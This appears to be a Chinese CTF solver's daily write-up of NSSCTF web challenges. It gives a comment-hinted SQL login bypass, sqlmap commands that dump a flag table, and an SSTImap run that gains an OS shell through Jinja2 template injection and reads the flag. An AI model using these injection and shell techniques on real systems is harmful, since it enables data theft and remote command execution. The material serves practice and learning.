# 2025-01-17 题解

## [MoeCTF 2022]Sqlmap_boy 

https://www.nssctf.cn/problem/3350

* 考点：SQL注入, sqlmap
* 工具：sqlmap

```bash
# 访问登录页，根据页面注释提示
#     <!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
#     select username,password from users where username="$username" && password="$password";
#     select username,password from users where username="admin" -- " && password="$password";

# conda activate pentest
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' -c 'PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a'
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' --cookie='PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a'
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' --cookie='PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a' --dbs
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' --cookie='PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a' --tables -D moectf
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' --cookie='PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a' -D moectf -T flag --columns
sqlmap -u 'http://node5.anna.nssctf.cn:21540/secrets.php?id=2' --cookie='PHPSESSID=43f72e5a89d64eaa9f7e4af07fe6ef1a' -D moectf -T flag -C flAg --dump

# 后记：通过 sqlmap 测试发现 users 表中一共 3 个用户，全是弱口令
# admin:admin
# root:root
# hack:admin123
```

## [HDCTF 2023]LoginMaster 

https://www.nssctf.cn/problem/3782

[hdctf2023-loginmaster.md](hdctf2023-loginmaster.md)

## [第五空间 2021]yet_another_mysql_injection 

https://www.nssctf.cn/problem/334

[第五空间2021-yet_another_mysql_injection.md](第五空间2021-yet_another_mysql_injection.md)

## [LitCTF 2024]一个....池子？ 

https://www.nssctf.cn/problem/5606

* 考点：SSTI
* 工具：sstimap

先用 SSTI payload 在 yakit 里 fuzz 了一遍，确认存在 SSTI 注入。

```bash
# ref: https://github.com/vladko312/SSTImap
python sstimap.py -u http://node4.anna.nssctf.cn:28633/echo -d input=1 --os-shell

    ╔══════╦══════╦═══════╗ 
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.3
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17; generic: 3
[*] Loaded request body types: 4

[*] Scanning url: http://node4.anna.nssctf.cn:28633/echo
[*] Testing if Body parameter 'input' is injectable
[*] Ejs plugin is testing rendering with tag '*'
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Ejs plugin is testing blind injection
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Freemarker plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Freemarker plugin is testing blind injection
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Dust plugin is testing rendering
[*] Dust plugin is testing blind injection
[*] Jinja2 plugin is testing rendering with tag '*'
[+] Jinja2 plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: input
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ cat /flag
NSSCTF{9e041429-9059-41fb-9852-3ed25f8caf9b}

```

做完之后，看了以下其他人的 WP，一并记录推荐：

- 手动注入 https://blog.csdn.net/qq_75120258/article/details/139482506 
- 看 https://blog.csdn.net/administratorlws/article/details/139449645 时，作者提到了另一种工具 https://github.com/Marven11/Fenjing 实测比 SSTImap 慢很多，使用时代理指向了 yakit ，全程记录了攻击过程
- 另一个 3.8k 的 SSTI 工具 https://github.com/epinna/tplmap 还没有测试

